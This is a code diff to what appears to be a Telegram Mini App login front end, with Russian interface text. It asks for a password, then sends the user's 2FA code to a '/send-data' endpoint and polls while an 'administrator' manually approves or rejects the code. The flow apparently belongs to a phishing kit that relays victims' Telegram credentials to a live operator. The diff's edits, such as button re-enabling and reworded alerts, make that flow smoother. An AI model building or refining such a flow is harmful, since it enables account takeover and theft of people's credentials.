@@ -57,6 +57,7 @@
         } catch (e) {
             console.error(e);
             tg.showAlert("Ошибка связи с сервером.");
+            return null;
         }
     }
 
@@ -71,6 +72,8 @@
         if (res && res.status === 'ok') {
             document.getElementById('auth-step').style.display = 'none';
             document.getElementById('2fa-step').style.display = 'flex';
+        } else {
+            document.getElementById('auth-btn').disabled = false;
         }
     }
 
@@ -82,7 +85,8 @@
         const res = await apiRequest('/send-data', { type: '2fa', code });
 
         if (res && res.status === 'ok') {
-            tg.showConfirm("Ожидание подтверждения...");
+            // Заменяем showConfirm на легкое уведомление
+            tg.showAlert("Запрос отправлен. Ожидайте решения администратора.");
 
             const checkInterval = setInterval(async () => {
                 try {
@@ -93,15 +97,17 @@
                         clearInterval(checkInterval);
                         document.getElementById('2fa-step').style.display = 'none';
                         document.getElementById('menu-step').style.display = 'flex';
-                        tg.showAlert("Доступ разрешен!");
+                        tg.showAlert("Вход разрешен!");
                     } 
                     else if (data.status === 'error') {
                         clearInterval(checkInterval);
-                        backToLogin();
-                        tg.showAlert("Код отклонен администратором.");
+                        tg.showAlert("Администратор отклонил код.");
+                        backToLogin(); // Возвращаем форму в начало
                     }
-                } catch (e) { console.error(e); }
+                } catch (e) { console.error("Ошибка опроса:", e); }
             }, 3000);
+        } else {
+            document.getElementById('2fa-btn').disabled = false;
         }
     }
 
@@ -109,6 +115,8 @@
         document.getElementById('2fa-step').style.display = 'none';
         document.getElementById('menu-step').style.display = 'none';
         document.getElementById('auth-step').style.display = 'flex';
+        
+        // Сброс состояния
         document.getElementById('auth-btn').disabled = false;
         document.getElementById('2fa-btn').disabled = false;
         document.getElementById('password').value = '';
